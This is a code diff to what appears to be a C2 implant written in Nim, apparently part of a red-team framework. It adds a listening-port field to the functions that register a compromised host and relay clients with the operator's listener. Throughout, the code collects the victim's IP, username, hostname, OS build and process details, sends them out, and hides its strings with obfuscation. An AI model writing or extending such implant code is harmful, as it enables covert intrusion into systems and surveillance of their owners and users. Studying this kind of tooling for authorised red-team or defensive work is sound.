@@ -366,11 +366,13 @@ proc init*(li: var Listener) : void =
         li.initialized = false
 
 # Initial registration function, including key init
-proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "STANDARD") : void =
+proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "STANDARD", listeningPort : int = 0) : void =
     # Once key is known, send a second request to register implant with initial info
     when defined verbose:
         echo obf("DEBUG: Sending registration request with ID: ") & li.id
         echo obf("DEBUG: Relay role: ") & relayRole
+        if listeningPort > 0:
+            echo obf("DEBUG: Listening port: ") & $listeningPort
     
     var data = %*
         [
@@ -382,7 +384,8 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
                 "p": pid,
                 "P": pname,
                 "r": riskyMode,
-                "R": relayRole
+                "R": relayRole,
+                "L": listeningPort
             }
         ]
     var dataStr = ($data)[1..^2]
@@ -420,11 +423,13 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
             echo obf("DEBUG: Registration successful. Implant now registered with ID: ") & li.id
 
 # Relay forwarding registration function - returns assigned ID and encryption key
-proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "RELAY_CLIENT") : (string, string) =
+proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "RELAY_CLIENT", listeningPort : int = 0) : (string, string) =
     # Forward registration for relay client using the relay client's ID
     when defined verbose:
         echo obf("DEBUG: Forwarding relay registration with relay client ID: ") & relayClientID
         echo obf("DEBUG: Relay role: ") & relayRole
+        if listeningPort > 0:
+            echo obf("DEBUG: Listening port: ") & $listeningPort
     
     var data = %*
         [
@@ -436,7 +441,8 @@ proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrI
                 "p": pid,
                 "P": pname,
                 "r": riskyMode,
-                "R": relayRole
+                "R": relayRole,
+                "L": listeningPort
             }
         ]
     var dataStr = ($data)[1..^2]
